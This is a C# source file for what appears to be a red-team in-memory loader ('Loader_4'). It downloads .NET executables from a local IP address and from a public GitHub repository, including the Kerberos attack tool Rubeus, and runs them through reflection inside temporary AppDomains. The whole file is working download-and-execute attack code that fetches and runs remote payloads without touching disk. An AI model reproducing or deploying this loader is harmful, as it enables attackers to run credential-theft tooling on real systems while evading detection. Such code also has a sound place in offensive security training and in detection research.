using System;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Xml.Linq;

namespace Loader_4
{
    public class Program
    {
        public class Worker : MarshalByRefObject
        {
            public void fetchFromWeb(string url, int retry, int timeout)
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                WebClient web = new WebClient();
                byte[] programBytes = null;

                while (retry > 0 && programBytes == null)
                {
                    try
                    {
                        programBytes = web.DownloadData(url);
                    }
                    catch (WebException ex)
                    {
                        Console.WriteLine(
                            "Assembly couldn't be loaded from the URL. Sleeping for {0} seconds and retrying for {1} time(s).",
                            timeout, retry);
                        retry--;
                        Thread.Sleep(timeout * 1000);
                    }
                }

                if (programBytes == null)
                {
                    Console.WriteLine("Assembly not found. Exiting the process...");
                    Environment.Exit(-1);
                }

                var asm = Assembly.Load(programBytes);
                Object[] param = new String[] { null };
                asm.EntryPoint.Invoke(null, param);
            }
        }

        static void Main(string[] args)
        {
            AppDomain first = AppDomain.CreateDomain("first");
            Console.WriteLine("First Appdomain created.");
            /*Console.ReadKey();*/
            Worker newWorker = (Worker)first.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
            newWorker.fetchFromWeb("http://192.168.1.125/LoadMe.exe", 3, 5);
            /*Console.ReadKey();*/
            Console.WriteLine("Unloading First Appdomain");
            AppDomain.Unload(first);
            /*Console.ReadKey();*/
            AppDomain second = AppDomain.CreateDomain("second");
            Console.WriteLine("second Appdomain created.");
            /*Console.ReadKey();*/
            Worker second_worker = (Worker)second.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
            second_worker.fetchFromWeb("http://192.168.1.125/mscorlib.exe", 3, 5);
            second_worker.fetchFromWeb("https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_Any/Rubeus.exe", 3, 5);
            /*Console.ReadKey();*/
            Console.WriteLine("Unloading Second Appdomain");
            AppDomain.Unload(second);
            /*Console.ReadKey();*/
        }
    }
}
